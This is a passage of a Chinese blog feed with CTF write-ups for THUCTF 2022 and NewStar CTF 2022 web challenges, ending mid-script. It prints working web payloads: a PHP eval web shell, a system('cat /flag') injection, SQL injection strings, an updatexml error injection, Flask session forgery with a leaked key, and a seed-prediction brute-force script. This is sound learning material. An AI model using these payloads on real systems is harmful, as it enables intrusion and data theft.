class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="What-is-flag3（未出）"><a href="#What-is-flag3（未出）" class="headerlink" title="What is $? - flag3（未出）"></a>What is $? - flag3（未出）</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">为啥允许上传 <span class="hljs-string">.php</span> 后缀文件？<br>file_get_contents 除了读文件<span class="hljs-string">...</span><br>这道题目与 PHP 反序列化相关<br></code></pre></td></tr></table></figure><p>不会，猜测是phar反序列化，不知道对不对，因为测试了file_get_contents可以触发phar（ 几乎所有文件操作函数都可<em>触发</em>phar<em>反序列化</em>）。我好菜QAQ</p><h2 id="PyChall-flag1"><a href="#PyChall-flag1" class="headerlink" title="PyChall - flag1"></a>PyChall - flag1</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Flask</span> session 伪造<br></code></pre></td></tr></table></figure><p>怀疑存在SSTI，试了一下登录用户无果，nc测试了一下确实可以发送请求。</p><p>在VPS上写1.txt</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041943090.png" alt="image-20221001164258655"></p><p>成功读取flask配置</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&lt;Config &#123;<span class="hljs-string">&#x27;ENV&#x27;</span>: <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-string">&#x27;DEBUG&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;TESTING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;74a832d6-c6ef-485c-a09c-3f1c38221674&#x27;</span>, <span class="hljs-string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(days=<span class="hljs-number">31</span>), <span class="hljs-string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: <span class="hljs-number">4093</span>&#125;&gt;<br></code></pre></td></tr></table></figure><p>得到密钥</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27;SECRET_KEY&#x27;: &#x27;<span class="hljs-number">74</span>a<span class="hljs-number">832</span>d<span class="hljs-number">6</span>-<span class="hljs-keyword">c</span><span class="hljs-number">6</span>ef<span class="hljs-number">-485</span><span class="hljs-keyword">c</span>-a<span class="hljs-number">09</span><span class="hljs-keyword">c</span><span class="hljs-number">-3</span>f<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">38221674</span>&#x27;<br></code></pre></td></tr></table></figure><p>接着伪造session（工具github上有）</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;74a832d6-c6ef-485c-a09c-3f1c38221674&quot;</span> -<span class="hljs-built_in">t</span> &#x27;&#123;<br>  <span class="hljs-string">&quot;isAdmin&quot;</span><span class="hljs-symbol">:</span> <span class="hljs-number">1</span>,<br>  <span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:</span> <span class="hljs-string">&quot;admin&quot;</span><br>&#125;&#x27;<br>eyJpc0FkbWluIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Yzf2kg.Jz8WAwQks8_33h-TZcruKEJtpSI<br></code></pre></td></tr></table></figure><p>修改session接着访问flag就行</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Here <span class="hljs-keyword">is</span> your flag: THUCTF&#123;Congratu1ate!Now-<span class="hljs-keyword">try</span>-<span class="hljs-keyword">to</span>-RCEeeee!@&#125;<br></code></pre></td></tr></table></figure><h2 id="PyChall-flag1（未出）"><a href="#PyChall-flag1（未出）" class="headerlink" title="PyChall - flag1（未出）"></a>PyChall - flag1（未出）</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">SSTI, <span class="hljs-keyword">Try</span> <span class="hljs-keyword">to</span> RCE<br></code></pre></td></tr></table></figure><p>第一关的时候就想到能不能rce了，但是因为打这题的时间偏晚了，而且fuzz有点点麻烦，所以浅试了一下就放弃了。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012031463.png" alt="image-20221001164649239"></p><p>过滤：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">class</span> + <span class="hljs-comment">&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="baby-gitlab"><a href="#baby-gitlab" class="headerlink" title="baby_gitlab"></a>baby_gitlab</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">22205</span><br></code></pre></td></tr></table></figure><p>照着这篇<a href="https://cloud.tencent.com/developer/article/2035967">大佬的文章</a>复现即可。</p><h2 id="easy-gitlab（未出）"><a href="#easy-gitlab（未出）" class="headerlink" title="easy_gitlab（未出）"></a>easy_gitlab（未出）</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2022</span>-<span class="hljs-number">2185</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/ESUAdmin/CVE-2022-2185">ESU管理员&#x2F;CVE-2022-2185：wo ee cve-2022-2185 gitlab 身份验证的rce (github.com)</a></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="小可莉能有什么坏心思呢？（未出）"><a href="#小可莉能有什么坏心思呢？（未出）" class="headerlink" title="小可莉能有什么坏心思呢？（未出）"></a>小可莉能有什么坏心思呢？（未出）</h2><p>小可莉都是坏心思</p><p>用stegsolve看到了ABCD的四个字母，EF应该在最后一张，但是我没调到清晰的图像，不干了，就这样吧！</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210012030916.png" alt="image-20221001150406791"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">THUCTF&#123;chtgzjsvkfdbetmv（还有EF）<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>THUCTF</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022New Star CTF</title>
    <link href="/2022/10/04/2022New%20Star%20CTF/"/>
    <url>/2022/10/04/2022New%20Star%20CTF/</url>
    
    <content type="html"><![CDATA[<p>大二菜鸡web手凑凑热闹</p><h1 id="web第一周"><a href="#web第一周" class="headerlink" title="web第一周"></a>web第一周</h1><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Please `GET` me your `name`,I will tell you more things.<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041941816.png" alt="image-20221004194015470"></p><p>name在cookie里</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?name=guest</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Hello,</span>guest. Please `POST` me the `key` Again.But Where is the key?<br></code></pre></td></tr></table></figure><p>上一步重放得到key</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041941786.png" alt="image-20221004194025751"></p><p>改cookie和key，别忘了加上name，得到flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210041942156.png" alt="image-20221004194039270"></p><h2 id="Head-Header"><a href="#Head-Header" class="headerlink" title="Head?Header!"></a>Head?Header!</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Must Use `CTF` Brower!<br></code></pre></td></tr></table></figure><p>改UA头</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: CTF<br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Must From <span class="hljs-string">`ctf.com`</span><br></code></pre></td></tr></table></figure><p>改referer</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">ref</span>erer:ctf.com<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Only</span> <span class="hljs-keyword">Local</span> <span class="hljs-keyword">User</span> Can <span class="hljs-keyword">Get</span> Flag<br></code></pre></td></tr></table></figure><p>改XFF</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">You Are Good,This <span class="hljs-built_in">is</span> your flag: flag&#123;2be4e45f-<span class="hljs-number">3274</span>-<span class="hljs-number">4b90</span>-b072-1458c040ba7b&#125; <br></code></pre></td></tr></table></figure><h2 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a>我真的会谢</h2><p>访问</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">robots<span class="hljs-selector-class">.txt</span>   www<span class="hljs-selector-class">.zip</span>    <span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span>.swp<br></code></pre></td></tr></table></figure><h2 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]) == <span class="hljs-string">&quot;Welcome to CTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]) == <span class="hljs-number">2077</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hack Me&quot;</span>;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Number error!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Wrong Key!&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Pass it!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">GET:   <span class="hljs-built_in">data</span>=<span class="hljs-built_in">data</span>:text/plain,Welcome <span class="hljs-keyword">to</span> CTF&amp;key1<span class="hljs-meta">[</span><span class="hljs-meta">]</span>=1&amp;key2<span class="hljs-meta">[</span><span class="hljs-meta">]</span>=2&amp;cmd=?&gt;<span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>POST:  num=<span class="hljs-number">2077</span>d<br></code></pre></td></tr></table></figure><h2 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a>Word-For-You</h2><p>一开始以为是时间盲注，用脚本跑了三天，没找到flag。后来才知道是万能密码。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="web第二周"><a href="#web第二周" class="headerlink" title="web第二周"></a>web第二周</h1><h2 id="Word-For-You-2-Gen"><a href="#Word-For-You-2-Gen" class="headerlink" title="Word-For-You(2 Gen)"></a>Word-For-You(2 Gen)</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">哇哇哇，我把查询界面改了，现在你们不能从数据库<br>中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了<br></code></pre></td></tr></table></figure><p>报错注入，就是查flag有点麻烦，显示不全</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select substr(group_concat(text),<span class="hljs-number">156</span>,<span class="hljs-number">200</span>)from wfy.wfy_comments),<span class="hljs-number">0</span>x7e),<span class="hljs-number">3</span>) or &#x27;<br></code></pre></td></tr></table></figure><h2 id="IncludeOne"><a href="#IncludeOne" class="headerlink" title="IncludeOne"></a>IncludeOne</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">文件包含漏洞系列第一题，也不知道是不是真的随机？ <br>出题人丢给你了一个工具：https:<span class="hljs-regexp">//</span>www.openwall.com<span class="hljs-regexp">/php_mt_seed/</span><br></code></pre></td></tr></table></figure><p>伪随机数漏洞，下载工具后爆破出seed</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">第一次使用工具，进入目录后，使用make命令，生成 php<span class="hljs-emphasis">_mt_seed文件以后就不用输入了。</span><br><span class="hljs-emphasis">使用./php_mt_</span>seed + 随机数即可。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;seed.php&quot;</span>);<br><span class="hljs-comment">//mt_srand(*********);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hint: &quot;</span>.<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base|\.\./i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/NewStar/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//flag in `flag.php`</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Baby Hacker?&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No Hacker!&quot;</span>;<br>&#125; Hint: <span class="hljs-number">1219893521</span><br>No Hacker!<br></code></pre></td></tr></table></figure><p>比如我的是1219893521</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271743188.png" alt="image-20220927174155302"></p><p>通过banner得到php版本为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure><p>选择种子，我的是1145146.</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1145146</span>);<br><span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">100</span>;<span class="hljs-variable">$j</span>++)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;,&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;]&quot;</span>;<br></code></pre></td></tr></table></figure><p>生成一个随机数字典。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Author:ArushArk</span><br><span class="hljs-comment">#python Version:3.8</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>dic=[<span class="hljs-number">1219893521</span>,<span class="hljs-number">1202031004</span>,<span class="hljs-number">1198284468</span>,<span class="hljs-number">286494712</span>,<span class="hljs-number">349108173</span>,<span class="hljs-number">1809608970</span>,<span class="hljs-number">1296391305</span>,<span class="hljs-number">1584324323</span>,<span class="hljs-number">311687746</span>,<span class="hljs-number">754807714</span>,<span class="hljs-number">1378740435</span>,<span class="hljs-number">1240698142</span>,<span class="hljs-number">850902888</span>,<span class="hljs-number">448566404</span>,<span class="hljs-number">1361733834</span>,<span class="hljs-number">1778856200</span>,<span class="hljs-number">1988406778</span>,<span class="hljs-number">1495264972</span>,<span class="hljs-number">1903272977</span>,<span class="hljs-number">58703413</span>,<span class="hljs-number">455580500</span>,<span class="hljs-number">1994516472</span>,<span class="hljs-number">816312968</span>,<span class="hljs-number">994125629</span>,<span class="hljs-number">51000526</span>,<span class="hljs-number">1676697449</span>,<span class="hljs-number">2041901805</span>,<span class="hljs-number">885667731</span>,<span class="hljs-number">1975663876</span>,<span class="hljs-number">734568242</span>,<span class="hljs-number">1323724304</span>,<span class="hljs-number">514265464</span>,<span class="hljs-number">236330101</span>,<span class="hljs-number">663707652</span>,<span class="hljs-number">1977098975</span>,<span class="hljs-number">1690359952</span>,<span class="hljs-number">521724654</span>,<span class="hljs-number">1817388172</span>,<span class="hljs-number">1695731145</span>,<span class="hljs-number">1225295724</span>,<span class="hljs-number">721542804</span>,<span class="hljs-number">254967530</span>,<span class="hljs-number">1028756011</span>,<span class="hljs-number">722379886</span>,<span class="hljs-number">335504268</span>,<span class="hljs-number">2129052130</span>,<span class="hljs-number">518286441</span>,<span class="hljs-number">1145042458</span>,<span class="hljs-number">531287820</span>,<span class="hljs-number">453239803</span>,<span class="hljs-number">884208358</span>,<span class="hljs-number">1803552100</span>,<span class="hljs-number">1229893025</span>,<span class="hljs-number">392415361</span>,<span class="hljs-number">285866846</span>,<span class="hljs-number">2016666724</span>,<span class="hljs-number">1558579835</span>,<span class="hljs-number">737190787</span>,<span class="hljs-number">1159720158</span>,<span class="hljs-number">1605504365</span>,<span class="hljs-number">1695906080</span>,<span class="hljs-number">1583216827</span>,<span class="hljs-number">1642926236</span>,<span class="hljs-number">2093852408</span>,<span class="hljs-number">406828797</span>,<span class="hljs-number">1052602660</span>,<span class="hljs-number">1042379469</span>,<span class="hljs-number">559390831</span>,<span class="hljs-number">254364212</span>,<span class="hljs-number">1601070263</span>,<span class="hljs-number">277797425</span>,<span class="hljs-number">668692328</span>,<span class="hljs-number">92642236</span>,<span class="hljs-number">645983585</span>,<span class="hljs-number">1529397220</span>,<span class="hljs-number">1149456801</span>,<span class="hljs-number">647566221</span>,<span class="hljs-number">1531730989</span>,<span class="hljs-number">593862593</span>,<span class="hljs-number">2083289232</span>,<span class="hljs-number">841560123</span>,<span class="hljs-number">1605162447</span>,<span class="hljs-number">844412911</span>,<span class="hljs-number">1699087969</span>,<span class="hljs-number">282286477</span>,<span class="hljs-number">1626489409</span>,<span class="hljs-number">608251064</span>,<span class="hljs-number">1641062602</span>,<span class="hljs-number">726736835</span>,<span class="hljs-number">1915814566</span>,<span class="hljs-number">804749745</span>,<span class="hljs-number">602578647</span>,<span class="hljs-number">977805082</span>,<span class="hljs-number">1152809971</span>,<span class="hljs-number">1501425859</span>,<span class="hljs-number">1703850369</span>,<span class="hljs-number">601482747</span>,<span class="hljs-number">1945550466</span>,<span class="hljs-number">413084764</span>,<span class="hljs-number">1927092530</span>,]<br>url = <span class="hljs-string">&quot;http://adc0e541-3e32-4478-9a63-50bd9bc98866.node4.buuoj.cn:81/&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://adc0e541-3e32-4478-9a63-50bd9bc98866.node4.buuoj.cn:81&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://adc0e541-3e32-4478-9a63-50bd9bc98866.node4.buuoj.cn:81/&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>data = &#123;<span class="hljs-string">&quot;guess&quot;</span>: <span class="hljs-built_in">str</span>(i)&#125;<br>re=requests.post(url, 